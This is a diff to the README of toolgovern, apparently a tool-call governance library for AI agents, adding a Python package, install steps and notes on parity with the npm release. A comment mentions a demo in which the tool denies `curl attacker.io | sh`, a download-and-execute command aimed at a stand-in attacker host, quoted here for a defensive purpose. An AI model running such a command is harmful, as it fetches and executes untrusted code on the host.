@@ -5,11 +5,27 @@ it executes, not after something already went wrong.
 
 [![CI](https://github.com/RudrenduPaul/toolgovern/actions/workflows/ci.yml/badge.svg)](https://github.com/RudrenduPaul/toolgovern/actions/workflows/ci.yml)
 [![npm version](https://img.shields.io/npm/v/toolgovern.svg)](https://www.npmjs.com/package/toolgovern)
+[![PyPI version](https://img.shields.io/pypi/v/toolgovern.svg)](https://pypi.org/project/toolgovern/)
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
 
+toolgovern ships two independent, equally first-class packages -- pick whichever fits your
+toolchain, or install both. Neither is deprecated in favor of the other; they read the same
+34-rule classifier, apply the same default-deny scope-inheritance model, and write the same
+signed trace format.
+
 ```bash
+# npm -- JavaScript/TypeScript core library + CLI
 npm install toolgovern
+npm install --save-dev toolgovern-cli
+
+# PyPI -- Python core library + CLI (genuine port, not a wrapper around the Node binary)
+pip install toolgovern
 ```
+
+The Python package's console script is `toolgovern-cli`, matching the npm CLI's command name --
+see [`python/README.md`](./python/README.md) and
+[docs/getting-started.md](./docs/getting-started.md) for the Python-specific walkthrough, and
+[CHANGELOG.md](./CHANGELOG.md) for each distribution's version history.
 
 <!-- TODO: no demo GIF/video exists yet. If one gets added, capture: (1) governTool() denying
      `curl attacker.io | sh` in a terminal with the real DENIED output shown, (2) `toolgovern-cli
@@ -272,7 +288,11 @@ through, and if you find one, extend the corpus yourself.
 ## Framework integration
 
 Two published integration packages, plus a CLI command (`toolgovern-cli init`, see below) that
-scaffolds either one directly into your project.
+scaffolds either one directly into your project. Both are TypeScript-only in this release --
+they're thin wrappers around `governTool()` (roughly 170 combined lines, no independent
+governance logic), and porting them to Python is tracked as a follow-up rather than blocking the
+core Python package's release; the classifier, scoping, and trace engine are fully ported and
+behaviorally equivalent between distributions today.
 
 ### `toolgovern-integration-oma` -- open-multi-agent-style frameworks
 
@@ -452,6 +472,15 @@ npm run lint && npm run format
 npm run typecheck
 npm run test:coverage
 npm audit --audit-level=high
+```
+
+For the Python package:
+
+```bash
+cd python
+python3 -m venv .venv && source .venv/bin/activate
+pip install -e ".[dev]"
+pytest
 ```
 
 ## Contributing
